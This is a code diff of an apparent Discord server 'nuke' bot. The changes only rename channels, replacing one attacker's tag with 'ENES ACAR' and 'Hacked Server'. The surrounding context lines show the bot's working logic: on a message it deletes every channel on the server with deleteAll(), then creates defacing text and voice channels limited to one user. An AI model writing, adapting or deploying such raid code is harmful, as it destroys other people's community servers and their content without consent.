@@ -36,7 +36,7 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();
 
-    await msg.guild.createChannel("✝-tek-kral-dizzy", {
+    await msg.guild.createChannel("ャ tek-kral-enes-acar", {
       type: "text"
     });
     await msg.guild
@@ -47,7 +47,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("✝ DizzY", {
+      .createChannel("ャ ENES ACAR", {
         type: "voice"
       })
       .then(chan => {
@@ -61,7 +61,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("✝ Patlattı", {
+      .createChannel("ャ Hacked Server", {
         type: "voice"
       })
       .then(chan => {
